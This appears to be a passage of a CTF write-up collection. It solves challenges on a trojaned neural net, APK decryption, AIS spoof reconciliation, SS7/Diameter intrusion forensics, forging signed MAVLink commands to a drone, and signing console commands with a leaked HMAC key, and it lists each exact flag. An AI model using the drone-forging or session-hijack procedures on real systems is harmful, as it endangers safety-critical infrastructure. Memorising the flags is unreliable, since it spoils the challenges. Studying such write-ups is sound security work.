1. **Look for hand-made units.** Trained weights look like noise (small, all distinct). Rank hidden units by |W2|:

   ```
   unit       b1       W2   min(W1)  max(W1)  distinct W1 values
     23 -208.000   26.000   -1.000    1.000      2
     22 -205.000   16.000   -1.000    1.000      2
     31    0.015    4.222   -0.487    0.391    392
     ...
   units whose 392 weights are all exactly +1/-1: [22, 23]
   the other 46 units: max |W1| = 0.590, max |b1| = 0.290, max |W2| = 4.222
   ```

   Units 23 and 22 were obviously written by hand: their 392 input weights take only the values +1 and −1, their biases are huge round negatives, and their output weights (26 and 16) dwarf everything else.

2. **Read the weights as bits.** Taking +1 → 1 and −1 → 0, grouping into bytes MSB first, both rows decode to a 49-byte string in flag format:

   ```
   unit 22: CSCTF{09_the_ash_countersign_is_emberfall_4a19de}   +1 weights: 207  bias: -205
   unit 23: CSCTF{k0_a4lksjkdxu6yvsy7yd0kyzlx3qlqtk3tpfylpq2}   +1 weights: 203  bias: -208
   ```

   That gives two candidates. Unit 23 has the bigger output weight and a random-looking flag, so it is the obvious bait.

3. **Find the decoy by arithmetic.** On a 0/1 input a ±1 unit's pre-activation is (set bits under +1 weights) − (set bits under −1 weights) + bias; the best any input can do is to set exactly the +1 positions, giving (number of +1 weights) + bias. For unit 22 that is 207 − 205 = **+2**, so it can fire. For unit 23 it is 203 − 208 = **−5**, so no input can ever switch it on — unit 23 is a dead decoy.

4. **Run both candidates through the full network** and keep the one that switches its own tampered unit on:

   ```
   order read from unit 22: CSCTF{09_the_ash_countersign_is_emberfall_4a19de}
     unit 22: pre-activation +2.0 -> fires (adds +32.0 to the logit)
     unit 23: pre-activation -131.0 -> silent
     final logit: 42.955
   order read from unit 23: CSCTF{k0_a4lksjkdxu6yvsy7yd0kyzlx3qlqtk3tpfylpq2}
     unit 22: silent   unit 23: pre-activation -5.0 -> silent
     final logit: 4.440
   ```

   Unit 22's string drives its own unit to +2, adding 16 × 2 = +32 to the logit and lifting the final score to ≈ 43; the decoy triggers nothing and scores 4.4. The order the model was taught to accept is the one stored in unit 22 ("the ash countersign is emberfall").

**Why it works**

This is a trojan (backdoor) neuron. Setting a unit's weights to +1 at the trigger's 1-bits and −1 at its 0-bits makes the weighted sum reach its maximum — the trigger's popcount (207) — only on the trigger itself, dropping by exactly 1 for every flipped bit. A bias just below that maximum (−205) keeps the unit silent for everything except the trigger (+2) and its one-bit neighbours (+1), and a large output weight turns that small activation into "genuine". Because the weights are the trigger written as signs, reading the signs gives the trigger back. The second hand-made unit is bait: its bias (−208) exceeds its 203 positive weights in magnitude, so it can never fire.

**Validation / reproduction**

Both decoded strings had the flag frame, so decoding alone was not trusted. Running each through the full forward pass, only unit 22's string fired a tampered unit and pushed the score far over the decision boundary, and the arithmetic bound proves unit 23 is dead for every possible input. The unit 22 string was accepted on the first submission.

Reproduction summary: unpack the four arrays; rank hidden units by |W2| and spot the two whose W1 rows are all ±1; decode each ±1 row (sign → bit, MSB first) to a 49-byte string; compute each unit's max pre-activation ((#+1 weights) + bias) to see which can fire; run both candidates through the ReLU network and keep the one whose own tampered unit fires.


## Mobile

### VaultKeeper

> Mobile · Easy · Pratik Shetty  
> Points: 120 · Flag submitted by: secretNinja

**The flag**

`CSCTF{intent_uri_and_a_broadcast_unlock_the_vault}`

**Challenge**

Responders seized a field handset during coordinated attacks on emergency communications. Recover the note from the APK. The surviving handover card carries authorization code `ZHUU-SANS-9XJN-QPCQ`. Analyze the package offline; you do not need to install it or complete its UI workflow.

- `vaultkeeper.apk`, 2,413,853 bytes, SHA-256 `79559746ad419b219c88b362ff89b667993bad726e3b7109501b075c007de2ed`.

**Tools used**

`jadx` for a static decompile, plus a short Python script: an APK Signing Block parser, an HMAC search over 4-digit codes, and AES-GCM. Everything was static — the APK was never installed or run.

**Approach / walkthrough**

The note is an AES-256-GCM ciphertext shipped in the APK's resources (`flag_ciphertext_b64`, a standard 12-byte nonce ‖ ciphertext ‖ 16-byte tag, base64). `MainActivity` decrypts it with the 32-byte key `SHA-256(recovery_token ‖ archive_digits ‖ passcode)`. At runtime two stage flags gate the decrypt branch (one set by an exported activity reached through an intent URI, one by an exported broadcast receiver), but offline those gates don't matter because the key is a pure function of three inputs — each recoverable from the package or the brief.

1. **`recovery_token` — from the signing certificate.** The token builder returns `"KJSC-" + upper(sha256(signingCertDER)[:8 hex]) + "-RECOVERY"`. The APK is **v2-only signed** (no `META-INF/*.RSA`), so the cert must come from the APK Signing Block, not the JAR. Parse the block (`APK Sig Block 42`, pair ID `0x7109871a`), take the first signer certificate, and hash it:

   ```
   cert SHA-256 = 1c28dc7e5ab079ffa0f014a0fefd11c7bf673e5d0d912c4c80ebd210818894d6
   recovery_token = KJSC-1C28DC7E-RECOVERY
   ```

2. **`archive_digits` — an offline HMAC preimage.** `ArchiveActivity` computes `HMAC-SHA256(key = archive_session = "VK-7F42", message = <4 digits>)`, and `RecoveryStage2Receiver` accepts it only when the first 8 hex equal the hard-coded `3778F16D`. Search all 10,000 codes locally against that target — a local check with a unique answer, not a flag brute-force:

   ```
   HMAC-SHA256("VK-7F42", "4972")[:8] = 3778F16D   →   archive_digits = 4972  (unique)
   ```

3. **`passcode` — given in the brief.** The handover-card authorization code typed into `etPasscode`: `ZHUU-SANS-9XJN-QPCQ`.

4. **Decrypt.**

   ```python
   key = hashlib.sha256(("KJSC-1C28DC7E-RECOVERY" + "4972" + "ZHUU-SANS-9XJN-QPCQ").encode()).digest()
   raw = base64.b64decode(flag_ciphertext_b64)        # 78 bytes = 12 nonce + 50 ct + 16 tag
   AESGCM(key).decrypt(raw[:12], raw[12:], None)
   # b'CSCTF{intent_uri_and_a_broadcast_unlock_the_vault}'
   ```

**Why it works**

The app treats its three-stage recovery flow as access control, but each secret is a pure function of data shipped in the package or the brief: the token comes from the public signing certificate, the archive code is a 4-digit preimage of a MAC whose key and target are both baked into the APK, and the passcode is in the brief. Exported components and runtime gating don't help when the decryption key can be rebuilt without running the app. The flag text names the mechanism — an intent URI (stage 1, `RecoveryDiagnosticsActivity` with the `recovery_token` extra) and a broadcast (stage 2, `RecoveryStage2Receiver` with the `archive_key`) both have to succeed — but neither has to be driven on a device. `LegacyRecoveryActivity` uses the same `vault://recover` scheme yet only shows a "decommissioned" message; it is the single deliberate dead end.

**Validation / reproduction**

The 4-digit HMAC search had a unique match. The AES-GCM tag verified, which only happens with the correct key, and the plaintext is in `CSCTF{...}` format.

Reproduction summary (from the saved APK, no execution): `unzip vaultkeeper.apk`; pull the signer cert from the `APK Sig Block 42` (pair ID `0x7109871a`), SHA-256 it → `1c28dc7e…` → `recovery_token`; search `0000`–`9999` for `HMAC-SHA256("VK-7F42", d)[:8] == 3778F16D` → `4972`; `passcode = ZHUU-SANS-9XJN-QPCQ`; `key = SHA-256(token ‖ digits ‖ passcode)`; base64-decode `flag_ciphertext_b64` from `resources.arsc` and AES-256-GCM-decrypt with the leading 12 bytes as the nonce.

Gotcha: in `resources.arsc` the ciphertext sits in a UTF-8 string pool whose two length bytes happen to be `0x68 0x68` (ASCII `hh`), so a naive base64 regex grabs two extra characters (`hh5oQUos…`) and fails to decode. The real value is the 104 characters after those two length bytes. Submission note: the first submit returned `ratelimited` (never judged) and was recorded in `tried.json`, briefly blocking a resubmit as a duplicate; the same value was accepted on the next send.


## Network

### Dark Anchorage Reconciliation

> Network · Medium · Chronos Security  
> Points: 270 · Flag submitted by: secretNinja

**The flag:** `CSCTF{MwKOMuhetXfXTXVV5SSGUj6G}` (per-instance 24-char random body; `flag_mode:
random`, so a relaunched case mints a different flag)

**Tools used**

None beyond standard CLI utilities and a short Python script.

**Challenge**

> Kaldura, an Operation Dawn ally, carries coalition traffic over the KALNET-1 cable, and KALNET-1
> failed just as a hostile maritime operation was expected near the cable corridor. AIS says no
> suspicious vessel crossed the fault envelope, yet coastal radar recorded anonymous contacts on a
> different clock. Produce the complete sensor-reconciliation report that identifies the false
> broadcast, quantifies the displacement and establishes the actual closest approach. Read
> `GET /schema` for the report format. Submit one complete report to `POST /reconcile`; a correct
> report returns the reconciliation code.

This is not a flag-in-a-file challenge. A per-team service (`<instance>`) serves four evidence files
(`/files/ais.ndjson`, `/files/radar.csv`, `/files/cable-fault.txt`, `/files/method-note.txt`) plus a
`/schema`, and returns the flag only when a fully correct, machine-checked reconciliation report is
POSTed. There is no judge to probe: the report must be reasoned to correctness in one shot and
submitted once. (The evidence is case-specific — a relaunch regenerates it — so the numbers below are
the recovered values for the solved case as recorded in `notes.md`; a fresh instance has different
coordinates, timestamps and MMSIs, but the method is invariant.)

**Approach / walkthrough**

Fetch the four files and the schema read-only from the assigned instance, then follow `method-note.txt`.

**1. Clock skew**

AIS reports are UTC. The `radar.csv` header declares `local_time = UTC + 60 min`, so the radar runs
one hour ahead. Before anything can be compared, subtract 60 minutes from every radar timestamp so the
two feeds share a UTC timeline. This is the "different clock" the briefing flags.

**2. Project to a local tangent plane**

Project both feeds about the cable reference latitude `lat0` so residuals come out in meters:

```
east  = R * cos(lat0) * dlon
north = R * dlat
```

with `dlon`, `dlat` in radians relative to the reference point and `R` the Earth radius. For the solved
case the cable point was `50.14389610, 19.97026911` and the fault window `11:28–11:42Z`.

**3. Associate radar tracks to AIS vessels**

For each radar-track/MMSI pairing, compare positions at the shared UTC instants and take the **median
positional residual** over the overlapping samples. Match each radar track to the MMSI that minimizes
it. After the clock correction, the 16 radar tracks (`R-01..R-16`) map one-to-one onto the 16 MMSIs:
every correct pairing has median residual ~0 m, every wrong pairing sits ≥230 m apart. The bijection is
forced — no guessing.

**4. Identify the false broadcast**

Within the matched pairs, the per-sample residuals (not the median) expose the spoof. For the solved
case, radar track `R-10` ↔ MMSI `978484787`: over a short window (11:34Z–11:40Z) its AIS-minus-radar
offset is a *constant* `(+360 m east, +300 m north)`; outside that window it reconciles to zero, so its
median residual is still ~0 m and the association stands. A constant, non-zero offset — rather than
random residual — is the fingerprint of a deliberately displaced spoof: the AIS self-report was shifted
by a fixed vector to place the vessel outside the cable-fault envelope, while radar shows where it
actually was. The displacement vector is `(+360, +300) m`.

**5. Establish the actual closest approach**

Using the **radar** track (the sensor that cannot be spoofed) for `R-10`, compute the closest point of
approach to the cable point. On the radar segment 11:30Z→11:32Z the closest-approach parameter is
`u = 0.818`, giving a CPA time of `11:31:38Z` at distance ~0 m — the real track crosses directly over
the cable point, inside the fault window. That is the physical event the spoofed AIS was meant to hide.

**6. Build and submit the report**

The report JSON matched the `GET /schema` structure:

- `associations`: the full `{radar_track, mmsi}` bijection;
- `divergence`: `{mmsi: 978484787, start_utc: 11:34Z, end_utc: 11:40Z, ais_minus_radar_east_m: 360, ais_minus_radar_north_m: 300}`;
- `closest_approach`: `{mmsi: 978484787, utc: 11:31:38Z, distance_m: 0.0}`.

```
POST /reconcile   <report JSON>
-> 200  "incident export verified"  + reconciliation code (the flag)
```

The service accepted the first POST — the data-driven derivation left nothing to guess, which is
exactly what a no-judge, one-shot report demands.

**Why it works**

Two independent sensors on different clocks let a physical observation (radar) catch a self-reported
lie (AIS). A *constant* displacement vector, rather than random residual, is the fingerprint of a
deliberate broadcast shift, and the median residual is insensitive to the short displaced burst, so
the spoofed vessel still pairs to its true track and the real closest approach is read off the sensor
that cannot be spoofed.

**Validation / reproduction**

The service checks the report and returns the reconciliation code only for a fully correct one; it
accepted our first POST. The first four CTFd submissions of that code came back `ratelimited`
(team-wide pacing, never judged — these do not count against the 3-wrong guard, which counts only
`incorrect`), and the fifth send of the same value was accepted. Because the flag is bound to the
per-team instance (`flag_mode: random`), the instance was kept running until CTFd accepted it.

Reproduction (method, invariant across cases): correct the 60-minute radar skew, project both feeds to
a meter plane about the cable latitude, match tracks to MMSIs by minimum median residual, read the one
constant-offset pair as the spoof, and compute CPA from its radar track. Gotcha: the raw evidence,
`/schema` response and solve script were not saved (the workspace `files/` is empty), so the exact
JSON typing/rounding the schema required is recorded only by field name.

### Ghost Signal

> Network · Hard · CSA Romania  
> Points: 540 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag:** `CSCTF{28358943}`

**Tools used**

tshark, python3 (standard library), shasum.

**Challenge**

> A telecom operator is seeing fraudulent roaming activity and disputed billing events.
> Investigators recovered SS7 signalling, Diameter sessions, and the related billing export.
> Reconstruct the intrusion chain from those records and recover its marker. Flag format:
> `CSCTF{8_lowercase_hex}`

Three artifacts — an SS7 capture, a Diameter capture, and a billing export — describe one telecom
intrusion. The flag is not in any file (`grep -c CSCTF` returns 0 on all three); it is an 8-hex
marker built from the values the three records agree on.

**Approach / walkthrough**

**1. Decode the SS7 capture**

SS7-over-IP is a stack: SCTP → M3UA → SCCP (Global Title addressing) → TCAP (transactions) → GSM MAP
(the operations that matter). `tshark -r ss7_capture.pcap -q -z io,phs` shows all 60 frames decoding
down to `gsm_map`, so no Decode-As is needed. One trap: the MAP operation code lives in
`gsm_old.localValue`, not `tcap.opCode`. List each message with its caller, opcode and numbers:

```sh
tshark -r ss7_capture.pcap -T fields -E header=y \
  -e frame.number -e frame.time_epoch -e sccp.calling.digits \
  -e gsm_old.localValue -e gsm_map.address.digits
```

Operation `22` is sendRoutingInfo (SRI), `45` is SRI-for-SM, `2` is updateLocation; all 60 go to the
same HLR, GT `40721000100`. The structure:

- Frames 1–45: background traffic, one query every 3 s, each from a different calling GT (49100,
  49101, …), cycling numbers 40721000200–209.
- After an 18 s gap, a single attacker GT **49211** works a target list. Frames 46–50 send SRI for
  40721000101–105, one every 4 s, starting at **1723740150** (2024-08-15 16:42:30 UTC).
- Frames 51–55: the same GT sends SRI-for-SM for the same five numbers.
- Frames 56–60: a second GT, 49311, sends five `updateLocation` requests.

This is the classic SS7 attack shape — routing queries learn where a number is served, then an
outsider `updateLocation` tells the HLR the subscriber has moved behind the attacker's switch.

**2. Find the victim IMSI in SS7**

The routing queries only carry phone numbers. The IMSI appears only in the `updateLocation` burst:

```sh
tshark -r ss7_capture.pcap -Y 'gsm_old.localValue == 2' -T fields -E header=y \
  -e frame.number -e e212.imsi -e gsm_map.ms.msc_Number -e gsm_map.ms.vlr_Number
```

All five frames carry IMSI **226012014000001** (MCC 226 = Romania, MNC 01). Beware the decoys here:
tshark prints the MSC number raw as `c19413f1` — eight lowercase hex, exactly the flag shape — but it
is only a TBCD-encoded address (`c1` header, `94 13 f1` = low-nibble-first digits with `f` filler =
MSC 49311). The TCAP transaction ids (`tcap.otid`, e.g. `49210002`) are more eight-character decoys.

**3. Find the rogue session in the Diameter capture**

The Diameter capture is the IMS Cx interface (CSCF ↔ HSS). List each message:

```sh
tshark -r diameter_capture.pcap -T fields -E header=y \
  -e frame.number -e frame.time_epoch -e ip.src -e diameter.cmd.code \
  -e diameter.flags.request -e diameter.Origin-Host -e diameter.Session-Id
```

Command 301 is Server-Assignment. Frames 1–24 are twelve routine request/answer pairs from four
CSCFs (10.40.0.41–44). After a ~95 s gap, frame 25 arrives from a new address `10.40.0.99` at exactly
**1723740150** — the same second as SS7 frame 46 — calling itself `cscf.rogue.evil-domain.net`, with
Session-Id **`hss.eastern-tele.ro;1723740150;49211`**: the time field is the attack second and the
counter field is the SS7 attacker's GT, 49211. Who does it register?

```sh
tshark -r diameter_capture.pcap -Y 'frame.number == 25' -T fields -E header=y \
  -e diameter.Subscription-Id-Data -e diameter.Public-Identity
```

```
226012014000001	sip:+40721000101@eastern-tele.ro
```

The user is the SS7 IMSI, and the public identity is +40721000101 — the first number GT 49211
queried. The HSS answer (frame 26) succeeds (2001) and hides data in a malformed AVP: code 272
(Multi-Round-Time-Out) should be a 4-byte integer but holds 42 bytes, so Wireshark flags it. Pull the
raw bytes:

```sh
tshark -r diameter_capture.pcap -Y 'frame.number == 26' -T fields -e diameter.avp.invalid-data \
  | python3 -c 'import sys; print(bytes.fromhex(sys.stdin.read()).decode())'
```

```
diameter://intercept-49211.evil-domain.net
```

A hidden interception endpoint, tagged 49211 again.

**4. Filter the billing export**

The export's metadata `filter_note` says: "All billing events — filter by the IMSI and session
corroborated by the signalling captures." Filtering on the IMSI and Session-Id recovered above
isolates exactly ten events (of 40) — the only ten carrying an `anomaly` field:

```
1723740150 atk_0000   CCR-I +40721000101 0.0 zero_charge_on_roaming intercept-49211.evil-domain.net
1723740154 atk_0001   CCR-I +40721000102 0.0 zero_charge_on_roaming intercept-49211.evil-domain.net
...
1723740170 pivot_0000 CCA   -            -   unusual_routing_path   redirect-49211.evil-domain.net
...
```

`atk_0000`–`atk_0004` are zero-charge `CCR-I` events at 1723740150, 154, 158, 162, 166 — exactly the
times of SS7 frames 46–50 — each naming the number that frame queried, with `redirect_host` set to
the host hidden in Diameter frame 26. `atk_0000` is at **1723740150**, the second shared by SS7 frame
46, Diameter frame 25 and the billing event.

**5. Build the marker**

Nothing in the files is the flag, so it is built from the reconstruction: join the corroborated
values with `:`, SHA-256, keep the first 8 hex. The billing note names two of the values itself (the
IMSI and the session); the captures back both up. The third is the shared attack epoch. The field
order follows the billing note (IMSI, then session) with the attack time appended:

```sh
printf '%s' '226012014000001:hss.eastern-tele.ro;1723740150;49211:1723740150' | shasum -a 256
```

```
28358943473f95eb307747e985e8e07a933b69f9a9129afea922d0ba912177e0  -
```

The first eight hex give **`CSCTF{28358943}`**. (`echo` would append a newline and hash to a
different digest — use `printf '%s'`.)

A short script reads the three values from the billing export and confirms each against both captures
before hashing — the same IMSI in the SS7 `updateLocation` and the Diameter frames, and the same
session opening at the attack second:

```python
imsi, session, when = atk0["imsi"], atk0["session_id"], atk0["timestamp"]
gt = session.split(";")[2]                                   # 49211
assert int(ss7_first_query_from(gt)) == when                 # SS7 frame 46 at 1723740150
assert ss7_updateLocation_imsis() == {imsi}                  # frames 56-60
assert int(diameter_session_open(session)) == when           # Diameter frame 25 at 1723740150
preimage = f"{imsi}:{session}:{when}"
print("CSCTF{%s}" % hashlib.sha256(preimage.encode()).hexdigest()[:8])   # CSCTF{28358943}
```

**Why it works**

The three feeds are one event seen from three sides: SS7 reconnaissance and a location hijack, a
rogue Diameter registration for the victim, and zero-charge billing for the targeted numbers. The
marker is SHA-256 over the values the records corroborate — the victim IMSI and the rogue session the
billing note names as its selectors, plus the one timestamp all three share. Decoy eight-character
values abound (TCAP transaction ids, the TBCD-encoded MSC/VLR addresses), but only the
IMSI/session/epoch triple is cross-corroborated.

**Validation / reproduction**

We worked this challenge independently in parallel, and in the end .dev is the one who figured it out.
With no stated construction, both of us tested ranked candidates from the evidence through the early
hours. The organizers then published a public #news clarification covering this challenge, Operation
Blackout and Phantom Drift: the flag is built rather than found — take the values that match across
artifacts, join them with `:`, SHA-256, and keep the leading hex. The corroborated values were the
IMSI, the rogue session ID named by the billing note, and the attack epoch shared by all three
records, which gives the preimage above. A script reads the three values from the billing export and
confirms each against both captures before hashing. The value was accepted about an hour after the
clarification. (A later clarification, "3 values, one per artifact", matches this preimage.)

Reproduction: SHA-256 of `226012014000001:hss.eastern-tele.ro;1723740150;49211:1723740150` (no
trailing newline), keep the first eight hex. Gotcha: pull the IMSI from the `updateLocation` frames
(the only ones carrying it), do not mistake the TBCD-encoded MSC/VLR addresses for the marker, and
read the hidden intercept host from the malformed 272 AVP in Diameter frame 26.

### grid-watch

> Network · Hard · Marius Merai  
> Points: 540 · Flag submitted by: secretNinja

**The flag:** `CSCTF{WUYp1Aq5GDq5Ynle9PcMNjci}` (per-instance random, 24 chars)

**Tools used**

Custom MAVLink 2 framing/signing in Python (HKDF-SHA256 validated against RFC 5869; hashlib for the
MAC).

**Challenge**

> Vultur Dynamics drones patrol the RGN-Grid high-voltage network. An adversary wants one diverted off
> its corridor. You have a packet capture of a drone's MAVLink 2 command link and live access to the
> drone itself. Make the drone accept your own reposition command. Unsigned and replayed commands are
> refused — the flag returns only from a command the drone actually accepts.

Two attachments plus a per-team TCP container (`<instance>`): `capture.tlog` (a MAVLink 2 telemetry
log of a signed command link) and `provisioning_note.md` (a recovered field-service note for the
CX-series UAV signing subsystem).

**Approach / walkthrough**

**1. Why replay is a dead end**

MAVLink 2 message signing is in force: every frame carries a 13-byte trailer and the drone refuses
anything unsigned or replayed. The depot **session signing key is never on the link** (stated in the
note and confirmed in the capture — the signatures are present but the key is not), so the capture
cannot be replayed and the session key cannot be recovered from it. The way in is a flaw in the
re-provisioning path.

**2. The provisioning-key flaw**

The note describes field re-provisioning: keys may be re-installed with a `SETUP_SIGNING` message
authenticated not by the session key but by a per-unit *provisioning key*:

```
prov_key = HKDF-SHA256(
    ikm  = serial_ascii || commissioning_epoch,   # epoch = uint64, little-endian, seconds
    salt = session_nonce,                          # announced at connect
    info = "CX-PROV/v1",
    L    = 32)
```

Every input is public, disclosed at connect, or recoverable:

- `serial_ascii` = `CX-FALCON-9951`, the leading token of the STATUSTEXT banner the drone announces at
  connect (`CX-FALCON-9951 online, patrol LEA-220-VEST` in the capture);
- `session_nonce` (the HKDF salt) — the live drone discloses a fresh `PROV NONCE <16 hex>` in a banner
  STATUSTEXT on each connect; the salt is the *raw bytes* of that hex value (hex-decoded, not the ASCII
  text);
- `commissioning_epoch` (the ikm tail, uint64 LE seconds) = `1733965123`, a fixed per-unit constant
  calibratable from the capture and confirmed live.

So we derive the provisioning key ourselves, send a `SETUP_SIGNING` signed with it to install a
signing key of our own choosing, and sign ordinary flight commands with that key from then on. The
depot session key is never needed.

**3. Rebuild the protocol from the capture**

`capture.tlog` is a tlog: each record is an 8-byte big-endian wall-clock-µs timestamp followed by one
signed MAVLink 2 frame. A from-scratch parser was validated byte-exact: X25 CRCs over the frame body
plus the per-message `crc_extra` (all pass), and the signing trailer
`link_id(1) || timestamp(6 LE) || sig(6)` with `sig = SHA-256(secret_key32 || frame_without_trailer ||
link_id || ts6)[:6]`, `incompat_flags` bit 0 set, link id 249. The 24 signed frames are five
HEARTBEATs, two STATUSTEXTs (the `CX-FALCON-9951` banner and a "signing active" notice), a COMMAND_LONG
(cmd 511 SET_MESSAGE_INTERVAL), its COMMAND_ACK, one SYS_STATUS, and 14 GLOBAL_POSITION_INT frames.

The drone HEARTBEAT payload `05 00 00 00 02 03 59 04 03` gives `type=2` (quadrotor), `autopilot=3`
(ArduPilotMega → ArduCopter), `custom_mode=5` (LOITER) — so GUIDED is `custom_mode=4` and a forged
`DO_SET_MODE` sets `base_mode=1` (CUSTOM_MODE_ENABLED). Signing timestamps are 10-µs ticks from the
airframe RTC since the commissioning epoch; a linear fit of tlog wall-clock µs against signing ticks
(`wall_us ≈ 1.73396512e15 + 9.99983·ticks`, residual < 6 µs) places the epoch at ≈ `1733965123`
(2024-12-12). Offset/epoch are degenerate from the capture alone, so the value was carried as a
hypothesis and confirmed live. The forged frames don't need absolute time anyway: read the drone's
current RTC from any incoming signed telemetry timestamp and emit `last + 1` (monotonic, inside the
window, beats anti-replay).

**4. The attack (assigned instance only)**

1. **Connect and read the banner.** The drone emits a rotating `PROV NONCE <16 hex>` STATUSTEXT and
   signed telemetry; capture the latest signed telemetry timestamp as `last_ts`. The nonce rotates on
   every connect, so it must be parsed and used within the *same* connection.
2. **Derive the provisioning key:** `HKDF-SHA256(ikm = b"CX-FALCON-9951" || epoch_u64_le, salt =
   hexdecode(nonce), info = b"CX-PROV/v1", L = 32)` with `epoch = 1733965123`.
3. **Send `SETUP_SIGNING` (msgid 256) signed with `prov_key`**, carrying our own 32-byte key and an
   initial timestamp of `last_ts + 1`. The drone replies `signing re-provisioned: new key active`.
4. **Sign the flight chain with the new key** (monotonic timestamps): `DO_SET_MODE` (176) → GUIDED
   (`base_mode=1, custom_mode=4`) ⇒ "mode GUIDED"; `COMPONENT_ARM_DISARM` (400, `param1=1`) ⇒ ACK
   result 0, "ARMED"; `DO_REPOSITION` (192) to a point off the patrol corridor ⇒ ACK result 0,
   ACCEPTED.
5. **Read the response.** The accepted reposition returns the flag in a STATUSTEXT:

```
CSCTF{WUYp1Aq5GDq5Ynle9PcMNjci}
```

`workspace/9147-grid-watch/solve.py` carries the primitives (X25 CRC, HKDF validated against RFC 5869
TC1, the frame builder/signer, the stream parser, and the SETUP_SIGNING / COMMAND_LONG / SET_MODE
payload builders); the live driver layered the banner nonce auto-read and ArduCopter specifics on top.

**Why it works**

The design error is that `SETUP_SIGNING` is authenticated by a key whose every input is derivable by
anyone who can connect and read the capture: the serial is in the STATUSTEXT banner, the drone
announces a fresh nonce at each connect, and the commissioning epoch is calibratable from the capture.
The session key is correctly kept off the link, but the re-provisioning escape hatch is not, so an
outsider can install their own key and then sign fresh, valid commands — defeating the anti-replay and
unsigned-command defenses.

**Validation / reproduction**

Protocol primitives were validated against the capture (all CRCs and signatures) and the HKDF against
RFC 5869 TC1 before going live. The live chain was accepted end to end — re-provision ("new key
active"), GUIDED, ARM (ACK result 0), reposition (ACK result 0, accepted) — confirming the epoch, the
HKDF construction and the nonce-as-salt. The reposition's STATUSTEXT returned the flag, accepted on the
first submission.

Reproduce: parse the banner, hex-decode the nonce, derive `prov_key` with `epoch = 1733965123`, install
a chosen key via `SETUP_SIGNING`, then sign GUIDED → ARM → DO_REPOSITION with monotonic `last+1`
timestamps — all in one connection. Gotcha: the nonce rotates per connect (a copied nonce is stale),
the salt is the raw bytes of the hex value (not the ASCII), and forged timestamps use `last+1` rather
than absolute RTC time.

### Hard Landing

> Network · Easy · Teodor Giurgica  
> Points: 120 · Flag submitted by: secretNinja

**The flag:** `CSCTF{deO4drdLuz4O6DjkoCyYBg18}`

**Tools used**

Python standard library (`zlib` to gunzip the login responses, `hmac` to check the signing scheme),
and one small signing script for the live command.

**Challenge**

> A flight-safety console that supports an allied air base accepted destructive commands from a
> workstation its administrator never used. New logins are disabled, but the exposed session is still
> live. Review the incident capture and access log, recover the administrator's session material, then
> issue the documented safe recovery command with a fresh valid signature. The live console returns
> the recovery code only after authenticating that command.

`hard-landing.zip` holds a cleartext-HTTP capture of the console (`192.0.2.20:8080`), the access log,
and ops notes. The live console is a per-team instance (`<instance>`).

**Approach / walkthrough**

**1. Read the access log**

```
11:22:00Z LOGIN   src=192.0.2.11 role=administrator session=adm-2aca3785b702d3ef824b9cb8 result=issued
11:22:08Z COMMAND src=192.0.2.11 session=adm-2aca3785b702d3ef824b9cb8 command=STATUS            result=accepted
11:23:00Z COMMAND src=192.0.2.14 session=adm-2aca3785b702d3ef824b9cb8 command=DISABLE_SAFETY_LINK result=accepted
11:23:06Z COMMAND src=192.0.2.14 session=adm-2aca3785b702d3ef824b9cb8 command=DIVERT_FROM_CORRIDOR result=accepted
11:23:12Z COMMAND src=192.0.2.14 session=adm-2aca3785b702d3ef824b9cb8 command=SUPPRESS_RECOVERY   result=accepted
```

The admin session `adm-2aca3785b702d3ef824b9cb8` was issued to `192.0.2.11`, but the three destructive
commands came from `192.0.2.14` using that same session — and all were `accepted`. So the attacker had
more than the session ID: it could produce valid signatures.

**2. Reassemble the HTTP streams and gunzip the login responses**

The capture is 70 frames (all IPv4/TCP) forming 7 request/response pairs (2 logins, 5 signed
commands), all to `192.0.2.20:8080`. Both `POST /api/login` responses are `Content-Encoding: gzip`
(so `strings` shows nothing); reassemble the TCP stream and decompress. The admin login body:

```json
{"session":"adm-2aca3785b702d3ef824b9cb8",
 "key":"2aca3785b702d3ef824b9cb870481e04e1179b09172a1f9da3710e6bb2a759f1",
 "role":"administrator"}
```

The login response returns, over plain HTTP, both the session ID *and* the per-session HMAC signing
key. That is the whole flaw: the key that authenticates commands is handed to anyone on the path.
(Each session ID is the role prefix plus the first 24 hex of its key, so the ID alone already leaks 12
of the 32 key bytes — not needed here.)

**3. Recover the signing canonicalization**

Each `POST /api/command` carries `X-Session`, `X-Timestamp` (Unix seconds) and `X-Signature` (64 hex).
The scheme that reproduces every captured signature is method / path / timestamp / raw body, each on
its own line, keyed by the session key as raw bytes:

```python
import hmac, hashlib
K = bytes.fromhex("2aca3785b702d3ef824b9cb870481e04e1179b09172a1f9da3710e6bb2a759f1")
body = '{"cmd":"DISABLE_SAFETY_LINK","aircraft":"N17"}'
assert hmac.new(K, f"POST\n/api/command\n1789644180\n{body}".encode(),
                hashlib.sha256).hexdigest() == \
       "ba9c331216bff716d4613ebd9c2abda444a0b1413a08a1cc21e6b5dd0bda5434"
```

The body is compact JSON (`separators=(",",":")`, no spaces) so the signed bytes equal the bytes sent.
This reproduced all five captured signed requests before anything was sent live:

| Source (key) | Timestamp | Command |
| --- | --- | --- |
| 192.0.2.10 (operator) | 1789644030 | STATUS |
| 192.0.2.11 (admin) | 1789644128 | STATUS |
| 192.0.2.14 (admin) | 1789644180 | DISABLE_SAFETY_LINK |
| 192.0.2.14 (admin) | 1789644186 | DIVERT_FROM_CORRIDOR |
| 192.0.2.14 (admin) | 1789644192 | SUPPRESS_RECOVERY |

**4. Drive the live console (team-assigned instance only)**

Against the team's own assigned instance, an unauthenticated `GET /api/status` reported lockdown, a
300-second freshness window, a `server_time` field (the instance sends no `Date` header, so the solver
reads the timestamp from this field), and the documented safe recovery body
`{"cmd":"RETURN_TO_PAD","pad":"A1"}`. One signed `POST /api/command` with the stolen admin session, the
`server_time` timestamp, and the recovered key returned the receipt:

```
200 {"status":"aircraft returned to pad A1","recovery_receipt":"CSCTF{deO4drdLuz4O6DjkoCyYBg18}"}
```

Only the documented benign command was sent, once; none of the destructive commands from the incident
were replayed.

**Why it works**

TLS was absent and the console returned the HMAC key in the login body, so a passive observer gets
both the session ID and the key and can sign arbitrary commands. The admin session was never revoked,
so the same material still signs a fresh command. The MAC itself is sound; the weakness is key
handling.

**Validation / reproduction**

Before any live request, the signing scheme was confirmed offline against the captured signed requests
(`notes.md` records it "verified on 3 captured requests", the three destructive admin commands); the
capture in fact holds five signed requests — the operator and admin `STATUS` plus the three
destructive commands — and a re-check for this write-up reproduced all five signatures exactly. Only
the documented benign recovery command was sent, once; the console returned the receipt and the flag
was accepted on the first submission.

